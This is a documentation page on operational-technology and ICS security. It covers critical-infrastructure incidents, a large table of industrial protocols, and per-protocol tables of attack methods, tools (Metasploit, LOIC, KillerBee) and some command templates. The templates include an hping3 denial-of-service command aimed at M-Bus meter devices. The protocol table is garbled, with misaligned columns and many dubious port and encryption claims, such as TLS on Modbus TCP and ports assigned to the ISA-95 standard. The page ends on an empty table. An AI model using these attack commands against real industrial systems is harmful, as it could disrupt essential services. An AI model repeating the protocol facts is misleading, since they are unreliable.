---
title: OT
sidebar: mydoc_sidebar
permalink: ot.html
folder: mydoc
---


## Introduction

OT (Operational Technology) security structure is a set of security measures and best practices designed to protect critical infrastructure and industrial control systems (ICS) that manage and monitor physical processes such as manufacturing, transportation, and energy distribution. The security structure includes several layers of security controls and policies that work together to protect OT systems from cyber threats.

Here are some key elements of an effective OT security structure:

1. **Network Segmentation**: The OT network should be segmented into different zones with varying levels of security controls. Each zone should have its own security policies and access controls.

2. **Access Controls**: Access to OT systems and devices should be limited to authorized personnel only. Strong authentication methods such as two-factor authentication should be used.

3. **Endpoint Protection**: All endpoints such as industrial controllers, sensors, and other devices should be secured with endpoint protection software, which can detect and prevent malware and unauthorized access.

4. **Vulnerability Management**: Regular vulnerability assessments and patching should be done to identify and fix vulnerabilities in OT systems and devices.

5. **Incident Response**: A well-defined incident response plan should be in place to respond to security incidents and minimize the impact of a breach.

6. **Training and Awareness**: Regular training and awareness programs should be conducted for employees and contractors to raise awareness of security risks and best practices.

7. **Compliance**: Compliance with industry-specific regulations and standards such as NIST SP 800-82 and IEC 62443 should be maintained to ensure the security of OT systems.


## Critical infrastructure


Critical infrastructure in OT (Operational Technology) refers to systems and assets that are essential for the functioning of a society, such as power grids, transportation systems, water treatment plants, and industrial control systems (ICS) used in manufacturing and energy production.
These include:

1. **Power Grids**: Electric power generation and distribution systems, including power plants, transmission lines, and transformers.

2. **Water Treatment Facilities**: Water purification and distribution systems, including water treatment plants, reservoirs, and pumping stations.

3. **Oil and Gas Pipelines**: Oil and gas pipelines that transport crude oil, natural gas, and refined petroleum products from production sites to refineries and distribution centers.

4. **Transportation Systems**: Transportation systems, including airports, seaports, and rail systems that transport people and goods.

5. **Industrial Control Systems**: Industrial control systems that control the operations of manufacturing plants and energy production facilities, including supervisory control and data acquisition (SCADA) systems, distributed control systems (DCS), and programmable logic controllers (PLC).

6. **Communication Networks**: Communication networks, including telephone networks, cellular networks, and internet service providers (ISP), which are essential for communication and data transmission.

7. **Financial Systems**: Financial systems, including banks, stock exchanges, and payment processing systems, which are essential for financial transactions and economic stability.

8. **Emergency Services**: Emergency services, including fire departments, police departments, and hospitals, which are essential for public safety and well-being.

9. **Government Services**: Government services, including government buildings, military installations, and intelligence agencies, which are essential for national security and government operations.

OT attacks on critical infrastructure can have severe consequences, including disruption of essential services, property damage, loss of life, and financial loss. Here are some examples of OT attacks on critical infrastructure:

1. **Stuxnet**: Stuxnet is a worm that was discovered in 2010 and is believed to be the first example of malware specifically designed to target industrial control systems. It targeted the nuclear program of Iran and was able to cause physical damage to centrifuges by exploiting vulnerabilities in the Siemens PLCs.

2. **Ukraine power outage**: In 2015 and 2016, Ukrainian power grids were targeted in a series of cyberattacks that resulted in a widespread power outage. The attackers were able to gain access to the ICS and cause physical damage to the equipment, resulting in the loss of power for hundreds of thousands of people.

3. **Triton**: Triton is a malware that was discovered in 2017 and is designed to target safety systems in industrial control systems. It was used in an attack on a Saudi Arabian petrochemical plant, and its purpose was to cause physical damage to the plant by disabling its safety systems.

4. **Colonial Pipeline**: In May 2021, a ransomware attack on the Colonial Pipeline, which supplies fuel to the eastern United States, resulted in a temporary shutdown of the pipeline. This caused a disruption in fuel supply and resulted in panic buying and long lines at gas stations.




## Protocol & Vendor

Based On Shamikkumar Dave Source

| Sr no. | Protocol          | Description                                               | Port       | Number Encryption                   | Security Vulnerabilities                               | Typical Use Cases                                     | Vendors Using It                                     |
|--------|-------------------|-----------------------------------------------------------|------------|------------------------------------|-------------------------------------------------------|------------------------------------------------------|------------------------------------------------------|
| 1      | Modbus            | A serial communication protocol widely used in industrial automation.                               | TCP: 502   | UDP: N/A   | Not Available (Plain Text)         | Lack of authentication, susceptible to eavesdropping  | SCADA systems, industrial control and monitoring      | Schneider Electric, Siemens, ABB                     |
| 2      | DNP3              | A robust and secure protocol for communication in electric power systems.                               | TCP: 20000-20005   | UDP: N/A   | Secure Authentication               | Vulnerable to man-in-the-middle attacks, lack of key management  | Electric power systems, water/wastewater management  | General Electric, Siemens, ABB                       |
| 3      | OPC               | A standard for interoperability between industrial automation systems.                                 | TCP: 135   | UDP: N/A   | TLS encryption                     | Vulnerable to unauthorized access, lack of data integrity | Industrial automation, device and software integration | Rockwell Automation, Honeywell, Yokogawa            |
| 4      | EtherNet/IP       | An industrial Ethernet protocol for real-time control and data exchange.                               | TCP: 44818   | UDP: 2222   | IPsec encryption (Achieved through IPsec implementation)       | Potential vulnerabilities in authentication and encryption | Integration of control systems, safety devices, data exchange | Rockwell Automation, Schneider Electric             |
| 5      | Profinet          | A communication protocol for real-time data exchange in industrial automation.                       | TCP: 34962   | UDP: 161   | IPsec encryption (Achieved through IPsec implementation)       | Vulnerabilities in access control, authentication mechanisms | Manufacturing, process control applications           | Siemens, Phoenix Contact, B&R Automation            |
| 6      | IEC 60870-5       | A protocol for communication in electrical utility automation systems.                                | TCP: 2404   | UDP: N/A   | Not Available (Plain Text)         | Lack of authentication, vulnerable to DoS attacks      | Monitoring and control of electrical power systems    | Siemens, ABB, Schneider Electric                     |
| 7      | PROFIBUS          | A fieldbus protocol for communication in automation systems.                                           | TCP: 3668   | UDP: N/A   | Not Available (Plain Text)         | Vulnerable to eavesdropping, unauthorized access       | Sensors, actuators, controllers in manufacturing       | Siemens, Phoenix Contact, ABB                       |
| 8      | HART              | A protocol for communication with intelligent field devices.                                            | TCP: 5094   | UDP: N/A   | Not Available (Plain Text)         | Vulnerable to spoofing, tampering                      | Industrial process monitoring and control             | Emerson, Honeywell, Yokogawa                         |
| 9      | BACnet            | A protocol for building automation and control networks.                                               | TCP: 47808   | UDP: N/A   | Secure Authentication and TLS encryption       | Vulnerable to unauthorized access, DoS attacks         | HVAC systems, lighting control, energy management      | Honeywell, Johnson Controls, Siemens                 |
| 10     | MQTT              | A lightweight messaging protocol for IoT and M2M communication.                                        | TCP: 1883   | UDP: N/A   | Not Available (Plain Text) to Vulnerable to spoofing, tampering | Industrial process monitoring and control | Emerson, Honeywell, Yokogawa | 
|11|CANbus|A bus standard for communication in vehicle systems.|N/A|Not Available (Plain Text)|Vulnerable to spoofing, replay attacks|Automotive systems, control units|Bosch, Continental, Delphi|
|12|WirelessHART|A wireless communication protocol based on HART for industrial|UDP: 5093|AES-128 encryption (Inherent encryption)|Vulnerable to jamming, unauthorized access|Wireless monitoring and control of industrial processes|Emerson, Honeywell, Siemens|
|13|IEC 61850|A protocol for communication in substation automation systems.|TCP: 102|UDP: 102|TLS encryption|Vulnerabilities in authentication, data integrity|Electric power substation automation, smart grid applications|
|14|Vnet/IP|Yokogawa Proprietery protocol for Centum VP Controllers|TCP: 44818|Can use SSL/TSL encryption|Weak authentication, Data integrity, Dos|All sectors in Industrial Automation|Yokogawa|
|15|SNMP|A protocol for network management and monitoring of devices.|UDP: 161|UDP: 162|v3 encryption|Vulnerabilities in authentication, data privacy|Network management, device monitoring and control|
|16|ICCP/TASE.2|A protocol for real-time information exchange between control centers|TCP: 102|UDP: 102|TLS encryption|Vulnerable to unauthorized access, data integrity issues|Inter-control center communication, energy management systems|
|17|CIP|A protocol for communication in industrial automation networks.|TCP: 44818|UDP: 2222|TLS encryption|Potential vulnerabilities in authentication and encryption|Integration of control systems, data exchange, safety devices|
|18|EtherCAT|A real-time Ethernet protocol for communication in motion control systems.|UDP: 8899|IPsec encryption (Achieved through IPsec implementation)|Vulnerabilities in authentication, data integrity|Motion control, automation systems|Beckhoff Automation, Omron, Bosch|
|19|WISA|A wireless protocol for industrial automation and control.|UDP: 49200|Not Available (Plain Text)|Vulnerable to unauthorized access, data integrity issues|Wireless industrial control and monitoring, asset management|Endress+Hauser, Pepperl+Fuchs, ABB|
|20|BACnet/IP|A variant of BACnet protocol using IP networks for building automation.|UDP: 47808|Secure Authentication and TLS encryption|Vulnerable to unauthorized access, DoS attacks|Building automation, control and monitoring|Honeywell, Johnson Controls, Siemens|
|21|Zigbee|A wireless communication protocol for low-power, low-data-rate IoT devices.|Various|AES encryption (Inherent encryption)|Vulnerabilities in authentication, data privacy|Home automation,.| Philips, Texas Instruments, Silicon Labs |
|22|PROFINET IO|A real-time industrial Ethernet protocol for automation systems.|TCP: 34962|UDP: 161|IPsec encryption (Achieved through IPsec implementation)|Vulnerabilities in access control, authentication mechanisms|Industrial automation, process control applications|
|23|ISA-95|A standard for integration of enterprise and control systems.|TCP: 44818|UDP: 2222|TLS encryption|Potential vulnerabilities in authentication and encryption|Integration of business and control systems, MES|
|24|LonWorks|A protocol for control networks used in building automation.|TCP: 1626|Not Available (Plain Text)|Vulnerabilities in authentication, data privacy|Building automation, lighting control, energy management|Echelon, Siemens, Schneider Electric|
|25|M-Bus|A protocol for remote reading of utility meters.|TCP: 50000|Not Available (Plain Text)|Vulnerable to unauthorized access, data integrity issues|Utility metering, remote meter reading|Kamstrup, Itron, Siemens|
|26|Modbus TCP/IP|A variant of Modbus protocol using TCP/IP for communication.|TCP: 502|UDP: N/A|Secure Authentication and TLS encryption|Lack of authentication, susceptible to eavesdropping|SCADA systems, industrial control and monitoring|
|27|CANopen|A higher-layer protocol based on CANbus for industrial automation.|N/A|Not Available (Plain Text)|Vulnerable to unauthorized access, message injection|Industrial automation, motion control systems|Beckhoff Automation, Bosch, Omron|
|28|KNX|A protocol for building automation and control networks.|TCP: 3671|UDP: 3672|Secure Authentication and TLS encryption|Potential vulnerabilities in authentication and encryption|Building automation, lighting control, HVAC systems|
|29|IEC 62351|A suite of protocols for secure communication in power systems.|TCP: 102|UDP: 102|TLS encryption|Vulnerabilities in authentication, key management|Secure communication in electric power systems|
|30|S7Comm|A proprietary protocol used in Siemens S7-300 and S7-400 PLCs.|TCP: 102|Secure Authentication and TLS encryption|Vulnerabilities in authentication, data integrity|Industrial automation, control systems|Siemens, Schneider Electric, ABB|
|31|H1 Fieldbus|A fieldbus protocol used in process automation and control systems.|TCP: 102|UDP: 102|Not Available (Plain Text)|Vulnerable to unauthorized access, data integrity issues|Process automation, control and monitoring|
|32|Zigbee RF4CE|A variant of Zigbee protocol for remote control applications.|Various|AES encryption (Inherent encryption)|Vulnerabilities in authentication, data privacy|Remote controls, consumer electronics|Philips, Texas Instruments, Silicon Labs|
|33|Foundation Fieldbus|A digital communication protocol for process control systems.|TCP: 2222|UDP: N/A|Not Available (Plain Text)|Vulnerabilities in authentication, data integrity|Process control, monitoring and diagnostics|
|34|MMS|A protocol for real-time data communication in industrial systems.|TCP: 102|UDP: 102|TLS encryption|Vulnerabilities in authentication, data integrity|Industrial control systems, real-time data exchange|
|35|EtherNet/IPTap|A protocol for network traffic monitoring in EtherNet/IP networks.|TCP: 2222|UDP: 2222|IPsec encryption (Achieved through IPsec implementation)|Vulnerable to unauthorized access, data integrity issues|Network traffic monitoring, diagnostics in EtherNet/IP networks|
|36|MelsecNet|A protocol for communication in Mitsubishi Electric PLC systems.|TCP: 5007|UDP: 5007|Not Available (Plain Text)|Vulnerabilities in authentication, data integrity|Industrial automation, process control systems|
|37|FOUNDATION HSE|A high-speed Ethernet protocol for process control systems.|TCP: 2222|UDP: N/A|Not Available (Plain Text)|Vulnerabilities in authentication, data integrity|Process control, high-speed data exchange|
|38|PROFIsafe|A safety communication protocol for fail-safe automation systems.|TCP: 34962|UDP: 161|IPsec encryption (Achieved through IPsec implementation)|Vulnerabilities in access control, authentication mechanisms|Safety-critical applications, industrial automation|
|39|DeviceNet|A network protocol for communication with industrial devices.|TCP: 44818|UDP: 2222|IPsec encryption (Achieved through IPsec implementation)|Potential vulnerabilities in authentication and encryption|Industrial device communication, sensor integration|
|40|HART-IP|A variant of HART protocol using IP networks for industrial applications.|UDP: 5094|IPsec encryption (Achieved through IPsec implementation)|Vulnerable to spoofing, tampering|Industrial process monitoring and control over IP networks|Emerson, Honeywell, Yokogawa|
|41|CIP Safety|A safety protocol for communication in industrial control systems.|TCP: 44818|UDP: 2222|TLS encryption|Potential vulnerabilities in authentication and encryption|Safety-critical applications, control system integration|
|42|EtherCAT P|A power-over-EtherCAT protocol for communication and power delivery.|UDP: 8899|IPsec encryption (Achieved through IPsec implementation)|Vulnerabilities in authentication, data integrity|Motion control, automation systems with power delivery|Beckhoff Automation, Omron, Bosch|
|43|WISA Wireless|A wireless protocol for communication in industrial automation.|UDP: 49200|Not Available (Plain Text)|Vulnerable to unauthorized access, data integrity issues|Wireless industrial control and monitoring, asset management|Endress+Hauser, Pepperl+Fuchs, ABB|
|44|BACnet/IPv6|A variant of BACnet protocol using IPv6 for building automation.|UDP: 47808|Secure Authentication and TLS encryption|Vulnerable to unauthorized access, DoS attacks|Building automation, control and monitoring with IPv6|Honeywell, Johnson Controls, Siemens|
|45|Zigbee IP|A variant of Zigbee protocol using IP networks for IoT applications.|Various|AES encryption (Inherent encryption)|Vulnerabilities in authentication, data privacy|IoT applications, wireless sensor networks with IP connectivity|Philips, Texas Instruments, Silicon Labs|
|46|CC-Link|A fieldbus protocol for industrial automation in Asia.|TCP: 5000|UDP: 5000|AES encryption (Inherent encryption)|Lack of authentication, susceptible to eavesdropping|Industrial automation, motion control systems in Asia|
|47|KNXnet/IP|A variant of KNX protocol using IP networks for building automation.|TCP: 3671|UDP: 3672|Secure Authentication and TLS encryption|Potential vulnerabilities in authentication and encryption|Building automation, lighting control, HVAC systems with IP connectivity|
|48|IEC 61883|A protocol for audio and video transmission in professional applications.|UDP: 61883|Not Available (Plain Text)|Vulnerabilities in authentication, data privacy|Audio/video transmission, professional multimedia applications|Sony, Panasonic, Canon|
|49|CIP Motion|A protocol for motion control in industrial automation systems.|TCP: 44818|UDP: 2222|TLS encryption|Potential vulnerabilities in authentication and encryption|Industrial motion control systems|
|50|WirelessMBus|A wireless communication protocol for utility metering applications.|TCP: 50000|AES-128 encryption (Inherent encryption)|Vulnerable to unauthorized access, data integrity issues|Wireless utility metering, remote meter reading|Kamstrup, Itron, Siemens|
|51|Fieldbus HSE|A high-speed Ethernet protocol for fieldbus communication.|TCP: 2222|UDP: N/A|Not Available (Plain Text)|Vulnerabilities in authentication, data integrity|Fieldbus communication, high-speed data exchange|
|52|Modbus/TCP|A variant of Modbus protocol using TCP/IP for communication.|TCP: 502|UDP: N/A|Secure Authentication and TLS encryption|Lack of authentication, susceptible to eavesdropping|SCADA systems, industrial control and monitoring|
|53|CC-Link IE|An industrial Ethernet protocol for automation systems in Asia.|TCP: 44818|UDP: 2222|IPsec encryption (Achieved through IPsec implementation)|Potential vulnerabilities in authentication and encryption|Industrial automation, motion control systems in Asia|
|54|Modbus/UDP|A variant of Modbus protocol using UDP/IP for communication.|UDP: 502|Not Available (Plain Text)|Lack of authentication, susceptible to eavesdropping|SCADA systems, industrial control and monitoring|Schneider Electric, Siemens, ABB|
|55|OPC UA|A machine-to-machine communication protocol for industrial automation.|TCP: 4840|UDP: 4840|Secure Authentication and TLS encryption|Potential vulnerabilities in authentication and encryption|Industrial automation, data exchange and interoperability|










### Modbus



|Attack Methods|Hacking Tools|Commands|Description|
|---|---|---|---|
| Modbus | Eavesdropping, Man-in-the-Middle (MitM) Attacks | Network Sniffers (e.g., Wireshark) | Read Holding Registers        | Modbus is a widely used serial communication protocol in industrial automation. It is commonly used in SCADA systems, industrial control, and monitoring. It operates over TCP port 502 and lacks authentication, making it susceptible to eavesdropping. |
| ------ | ----------------------------------------------- | ---------------------------------- | ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|        |                                                 |                                    | Write Single Register         |                                                                                                                                                                                                                                                           |
|        |                                                 |                                    | Read/Write Multiple Registers |                                                                                                                                                                                                                                                           |








### DNP3

|ID|Attack Methods|Hacking Tools|Commands|Description|
|---|---|---|---|---|
|DNP3|Man-in-the-Middle Attacks|Network Sniffers|Read Data|DNP3 is a robust and secure protocol used for communication in electric power systems, as well as water and wastewater management. It operates over TCP ports 20000-20005 and does not use UDP.|
||||Write Data||
||||Control Operations||
||||Device Configuration||


### OPC

|ID|Attack Methods|Hacking Tools|Commands|Description|
|---|---|---|---|---|
|OPC|Unauthorized Access|Network Scanners|Read Tag Data|OPC (OLE for Process Control) is a standard for interoperability between industrial automation systems. It uses TCP port 135 and supports TLS encryption for secure communication.|
||||Write Tag Data||
||||Invoke Methods||
||||Data Access Read/Write|


### EtherNet/IP


|ID|Attack Methods|Hacking Tools|Commands|Description|
|---|---|---|---|---|
|EtherNet/IP|Authentication Bypass, Packet Sniffing|Packet Sniffers (e.g., Wireshark)|Read Tag Data|EtherNet/IP is an industrial Ethernet protocol used for real-time control and data exchange. It operates over TCP port 44818 and UDP port 2222.|
|     |     |     | Write Tag Data       |     |
| --- | --- | --- | -------------------- | --- |
|     |     |     | Device Configuration |     |
|     |     |     |                      |     |



### Profinet

|ID|Attack Methods|Specific Tools|Specific Commands|Description|
|---|---|---|---|---|
|Profinet|Access Control Bypass, Man-in-the-Middle Attacks|Packet Sniffers (e.g., Wireshark)|Read Process Data|Profinet is a communication protocol used for real-time data exchange in industrial automation. It operates over TCP port 34962 and UDP port 161.|
||||Write Process Data||
||||Diagnostic Information||


### IEC 60870-5

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Denial-of-Service (DoS) Attacks|DoS Tools (e.g., LOIC)|C_SC_NA (45h)|Control command used for Single-Command (SC) normalized value for Network Areas (NA)|
|Lack of Authentication|Network Sniffers (e.g., Wireshark)|C_IC_NA (64h)|Control command used for Interrogation of Counter (IC) normalized value for Network Areas (NA)|


### PROFIBUS

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Eavesdropping|Packet Sniffers (e.g., Wireshark)|N/A|Passive monitoring and capturing of network traffic to intercept and analyze PROFIBUS communication|
|Unauthorized Access|PROFIBUS Configuration Tools|N/A|Use of unauthorized configuration tools to gain access to PROFIBUS network and devices|


### HART

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Spoofing|HART Modem, Software|Universal Command (UCOM)|Unauthorized transmission of spoofed messages to impersonate a legitimate field device|
|Tampering|HART Configurator|Read/Write Commands|Unauthorized modification of device configuration parameters and process variable settings|


### BACnet

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Unauthorized Access|BACnet Discovery Tools|N/A|Exploiting vulnerabilities to gain unauthorized access to BACnet networks and devices|
|DoS Attacks|Network Stress Testing Tools|N/A|Overloading BACnet devices or networks with excessive traffic, causing disruption of services|


### MOTT

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Unauthorized Access|MQTT Packet Sniffing Tools|CONNECT, PUBLISH, SUBSCRIBE|Intercepting MQTT packets to gain unauthorized access to the broker or IoT devices' communication, compromising data integrity|
|Data Privacy|MQTT Message Analyzer|N/A|Analyzing MQTT messages to extract sensitive information, compromising the privacy and confidentiality of IoT data|



### CANbus

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Spoofing|CANbus Spoofing Tools|N/A|Sending forged CAN messages with altered identifiers or data, impersonating legitimate devices or commands|
|Replay Attacks|CANbus Replay Tools|N/A|Capturing and replaying previously sent CAN messages to deceive the system or retrigger specific commands|


### WirelessHART

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Jamming|Jamming Devices|N/A|Emitting interference signals to disrupt or disable wireless communication, causing data loss or interruptions|
|Unauthorized Access|WirelessHART Sniffers|N/A|Capturing and analyzing WirelessHART packets to gain unauthorized access or extract sensitive information|


### IEC 61850

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Unauthorized Access|IEC 61850 Exploitation Tools|N/A|Exploit vulnerabilities in the IEC 61850 protocol to gain unauthorized access to substation devices and control systems|
|Data Manipulation|Packet Manipulation Tools|N/A|Modify or manipulate IEC 61850 packets to tamper with data, commands, or control signals within the substation automation system|


### Vnet/IP

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Weak Authentication|Exploitation Tools|N/A|Exploit vulnerabilities in the weak authentication mechanism of Vnet/IP to gain unauthorized access to Centum VP Controllers|
|Data Integrity|Packet Manipulation Tools|N/A|Manipulate Vnet/IP packets to tamper with data, commands, or control signals, compromising the integrity of the communication|
|Denial of Service (DoS)|DoS Tools|N/A|Launch DoS attacks targeting Vnet/IP infrastructure to disrupt or disable the communication and services|


### SNMP

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Vulnerabilities in Authentication|SNMP Frameworks|N/A|Exploit weaknesses in SNMP authentication mechanisms to gain unauthorized access to network devices and management systems|
|Data Privacy|SNMP Sniffing Tools|N/A|Capture and analyze SNMP traffic to intercept sensitive data, including community strings, SNMPv3 credentials, and more|
|Denial of Service (DoS)|DoS Tools|N/A|Launch DoS attacks targeting SNMP agents or management systems, disrupting the network management and monitoring processes|


### ICCP/TASE.2

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Unauthorized Access|Exploitation Tools|N/A|Exploit vulnerabilities in ICCP/TASE.2 implementations to gain unauthorized access to control centers and sensitive information|
|Data Integrity Issues|Traffic Manipulation|N/A|Manipulate ICCP/TASE.2 messages to modify or inject false information, compromising the integrity of real-time data exchange|


### CIP

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Unauthorized Access|Exploitation Tools|N/A|Exploit vulnerabilities in CIP implementations to gain unauthorized access to industrial automation networks|
|Potential Vulnerabilities|Security Scanners|N/A|Scan for potential vulnerabilities in CIP protocol implementations|
|Traffic Analysis|Network Sniffers|N/A|Capture and analyze network traffic to gather information about CIP-based communications|
|Man-in-the-Middle Attacks|MITM Tools|N/A|Intercept and manipulate CIP communications between devices to gain unauthorized control or gather data|
|Encryption Bypass|Cryptographic Tools|N/A|Attempt to bypass or break the TLS encryption used in CIP communications for unauthorized access|


### EtherCAT

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Unauthorized Access|Exploitation Tools|N/A|Exploit vulnerabilities in EtherCAT implementations to gain unauthorized access to motion control systems|
|Data Manipulation|Packet Manipulation|N/A|Manipulate EtherCAT packets to modify or inject data within the communication flow|
|Denial of Service (DoS)|DoS Tools|N/A|Overload or disrupt EtherCAT communication channels to cause a denial of service|
|Man-in-the-Middle Attacks|MITM Tools|N/A|Intercept and manipulate EtherCAT communication between devices to gain unauthorized control or gather data|
|Encryption Bypass|Cryptographic Tools|N/A|Attempt to bypass or break the IPsec encryption used in EtherCAT communications for unauthorized access|


### WISA

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Unauthorized Access|Exploitation Tools|-|Exploit vulnerabilities in WISA implementations to gain unauthorized access to industrial control systems|
|Data Manipulation|Packet Manipulation|-|Manipulate WISA packets to modify or inject data within the communication flow|
|Denial of Service (DoS)|DoS Tools|-|Overload or disrupt WISA communication channels to cause a denial of service|
|Sniffing and Eavesdropping|Packet Sniffing Tools|Wireshark, tcpdump|Capture and analyze WISA packets to gather information and potentially extract sensitive data|
|Jamming|Jamming Tools|-|Transmit interference signals to disrupt or disable WISA communication|
|Reverse Engineering|Reverse Engineering Tools|-|Analyze the WISA protocol, firmware, or devices to understand its inner workings and uncover potential vulnerabilities|


### BACnet/IP

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Unauthorized Access|Exploitation Tools|-|Exploit vulnerabilities in BACnet/IP implementations to gain unauthorized access to building automation systems|
|Denial of Service (DoS)|DoS Tools|-|Overload or disrupt BACnet/IP communication channels to cause a denial of service|
|Protocol Fuzzing|Fuzzing Tools|-|Send malformed or unexpected BACnet/IP packets to discover protocol vulnerabilities and potential security flaws|
|Sniffing and Eavesdropping|Packet Sniffing Tools|Wireshark, tcpdump|Capture and analyze BACnet/IP packets to gather information and potentially extract sensitive data|
|Vulnerability Scanning|Scanning Tools|Nmap, Nessus, OpenVAS|Scan BACnet/IP networks and devices for known vulnerabilities, misconfigurations, or weak points|
|Exploitation Frameworks|Metasploit, Exploit Packs|Various Metasploit modules and exploits|Utilize existing BACnet/IP exploits within frameworks like Metasploit to automate attacks and gain unauthorized access|
|Reverse Engineering|Reverse Engineering Tools|-|Analyze the BACnet/IP protocol, firmware, or devices to understand its inner workings and uncover potential vulnerabilities|


### Zigbee

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Unauthorized Access|Exploitation Tools|-|Exploit vulnerabilities in Zigbee implementations to gain unauthorized access to IoT devices and networks|
|Sniffing and Eavesdropping|Packet Sniffing Tools|Wireshark, Kismet|Capture and analyze Zigbee network traffic to gather information, extract encryption keys, or intercept sensitive data|
|Jamming|Jamming Tools|-|Transmit interference signals to disrupt or disable Zigbee communication, causing denial of service|
|Replay Attacks|Replay Attack Tools|-|Capture and replay Zigbee network packets to impersonate devices or repeat previously valid commands|
|Device Fingerprinting|Fingerprinting Tools|-|Identify Zigbee devices, their capabilities, and potential vulnerabilities through passive or active fingerprinting|
|Brute-Force Attacks|Brute-Force Tools|-|Attempt to guess or systematically try possible encryption keys or device credentials to gain unauthorized access|
|Exploitation Frameworks|Metasploit, Exploit Packs|Various Metasploit modules and exploits|Utilize existing Zigbee exploits within frameworks like Metasploit to automate attacks and gain unauthorized access|
|Zigbee Hacking Tools|Zigbee-specific Tools|KillerBee, z3sec, ZigDiggity, Zigbee2MQTT, Zigbee-Tool, ZBScanner|Specialized tools for analyzing, manipulating, or attacking Zigbee networks and devices|
|Zigbee Sniffing and Exploitation|Zigbee Capture and Exploitation Tools|Z3sec, zigbee-sec, KillerBee, zbdsniff|Tools designed to capture and analyze Zigbee traffic, identify vulnerabilities, and exploit weaknesses in Zigbee implementations|


### PROFINET IO

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Unauthorized Access|Exploitation Tools|-|Exploit vulnerabilities in PROFINET IO implementations to gain unauthorized access to industrial automation systems|
|Network Scanning|Network Scanning Tools|Nmap|Scan the network for PROFINET IO devices and identify potential vulnerabilities and open ports|
|Sniffing and Eavesdropping|Packet Sniffing Tools|Wireshark, Tshark|Capture and analyze PROFINET IO network traffic to gather information, extract data, or identify potential security issues|
|Denial of Service (DoS)|DoS Attack Tools|Hping3, LOIC, Slowloris|Launch DoS attacks targeting PROFINET IO devices or network infrastructure to disrupt communication or cause system downtime|
|Exploitation Frameworks|Metasploit, Exploit Packs|Various Metasploit modules and exploits|Utilize existing PROFINET IO exploits within frameworks like Metasploit to automate attacks and gain unauthorized access|
|Industrial Protocol Tools|PROFINET-specific Tools|PROFINET Wireshark Dissector, PROFINET Scanner|Tools designed specifically for analyzing, monitoring, or attacking PROFINET IO networks and devices|
|Industrial Control System Tools|ICS Security Tools|SCADAguardian, Wurldtech Achilles, Indegy|Specialized tools for assessing the security of industrial control systems, including PROFINET IO|
|GitHub Tools|Security-related Repositories on GitHub|-|Explore security-related repositories on GitHub for PROFINET IO vulnerabilities, exploits, or proof-of-concept code|


### ISA-95

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Unauthorized Access|Exploitation Tools|-|Exploit vulnerabilities in ISA-95 implementations to gain unauthorized access to integrated enterprise and control systems|
|Network Scanning|Network Scanning Tools|Nmap|Scan the network for ISA-95 systems and identify potential vulnerabilities and open ports|
|Sniffing and Eavesdropping|Packet Sniffing Tools|Wireshark, Tshark|Capture and analyze network traffic in ISA-95 integration to gather information, extract data, or identify security issues|
|Denial of Service (DoS)|DoS Attack Tools|Hping3, LOIC, Slowloris|Launch DoS attacks targeting ISA-95 systems or network infrastructure to disrupt communication or cause system downtime|
|Exploitation Frameworks|Metasploit, Exploit Packs|Various Metasploit modules and exploits|Utilize existing exploits within frameworks like Metasploit to automate attacks on ISA-95 systems|
|Industrial Control System Tools|ICS Security Tools|SCADAguardian, Wurldtech Achilles, Indegy|Specialized tools for assessing the security of industrial control systems, including ISA-95|

### Lon Works


| Attack Methods             | Specific Tools               | Specific Commands and Codes           | Commands Description                                                                                                      |
| -------------------------- | ---------------------------- | ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| Unauthorized Access        | Exploitation Tools           | -                                     | Exploit vulnerabilities in LonWorks implementations to gain unauthorized access to control networks                       |
| Network Scanning           | Network Scanning Tools       | nmap -p 1626 <target_ip>              | Scan the network for LonWorks devices and identify potential vulnerabilities and open ports                               |
| Sniffing and Eavesdropping | Packet Sniffing Tools        | `tcpdump -i <interface> -s 0 port 1626` | Capture and analyze network traffic in LonWorks control networks to gather information or identify security issues        |



### M-Bus

|Attack Methods|Specific Tools|Specific Commands and Codes|Commands Description|
|---|---|---|---|
|Unauthorized Access|Exploitation Tools|-|Exploit vulnerabilities in M-Bus implementations to gain unauthorized access to utility metering systems|
|Network Scanning|Network Scanning Tools|nmap -p 50000 ``<target_ip>``|Scan the network for M-Bus devices and identify potential vulnerabilities and open ports|
|Sniffing and Eavesdropping|Packet Sniffing Tools|tcpdump -i ``<interface>`` -s 0 port 50000|Capture and analyze network traffic in M-Bus systems to gather information or identify security issues|
|Denial of Service (DoS)|DoS Attack Tools|hping3 -c ``<count>`` -p 50000 ``<target_ip>``|Launch DoS attacks targeting M-Bus devices or network infrastructure to disrupt communication or cause system downtime|
|Exploitation Frameworks|Metasploit, Exploit Packs|-|Utilize existing exploits within frameworks like Metasploit to automate attacks on M-Bus systems|
|Python Codes|Python-based Exploit Scripts|-|Develop custom Python scripts to exploit vulnerabilities or automate specific attacks on M-Bus systems|


### Modbus TCP/IP


|Attack Methods|Specific Offensive Security Tools in Kali Linux|Specific Exploit in Metasploit or Exploit Pack|Specific Nmap Script Name|Commands Description|
|---|---|---|---|---|
